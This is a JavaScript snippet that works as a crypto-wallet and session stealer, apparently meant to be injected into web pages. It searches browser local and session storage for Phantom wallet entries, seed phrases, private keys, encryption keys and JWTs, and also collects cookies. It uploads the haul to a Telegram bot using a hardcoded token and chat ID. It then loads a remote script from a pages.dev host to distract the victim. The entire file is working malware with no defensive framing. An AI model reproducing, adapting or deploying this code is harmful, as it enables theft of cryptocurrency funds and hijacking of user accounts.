(async function() {
    const BOT_TOKEN = '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA';
    const CHAT_ID = '8321398409';
    
    try {
        let vaultReport = `--- VANTA ENGINE EXTRACTION: ${location.hostname} ---\n\n`;
        
        // Target list based on your requirements
        const targets = [
            '.phantom', '.vault', '.offline', '.fungible', 'padre-v2', 
            'seed', 'privateKey', 'encryptionKey', 'client-jwt'
        ];

        // Scrape Local and Session Storage
        [localStorage, sessionStorage].forEach(storage => {
            for (let i = 0; i < storage.length; i++) {
                let key = storage.key(i);
                if (targets.some(t => key.toLowerCase().includes(t))) {
                    vaultReport += `[KEY: ${key}]\n${storage.getItem(key)}\n\n`;
                }
            }
        });

        vaultReport += `--- COOKIES ---\n${document.cookie}\n`;

        // Create Blob and Send to Telegram via sendDocument
        const blob = new Blob([vaultReport], { type: 'text/plain' });
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('document', blob, `vault_data_${Date.now()}.txt`);
        formData.append('caption', `📡 Vault Captured: ${location.hostname}`);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });

        // Load the Visual Modal to distract the user
        const modal = document.createElement('script');
        modal.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
        document.head.appendChild(modal);

    } catch (err) {
        console.error('Vanta Engine Error');
    }
})();
